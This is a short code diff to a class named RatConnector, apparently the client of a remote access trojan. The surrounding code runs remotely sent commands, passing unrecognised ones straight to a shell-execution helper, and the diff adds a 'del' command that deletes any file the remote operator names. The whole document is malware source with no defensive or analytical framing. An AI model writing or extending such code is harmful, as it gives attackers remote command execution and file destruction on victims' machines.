@@ -284,6 +284,9 @@ class RatConnector:
                 elif command[0] == "ls" or command[0] == "dir":
                     commandResponse = self.run_command("dir").decode('ISO-8859-1')
                 
+                elif command[0] == "del":
+                    commandResponse = os.remove(command[1])
+                
                 else:
                     convCommand = self.array_to_string(command)
                     commandResponse = self.run_command(convCommand)
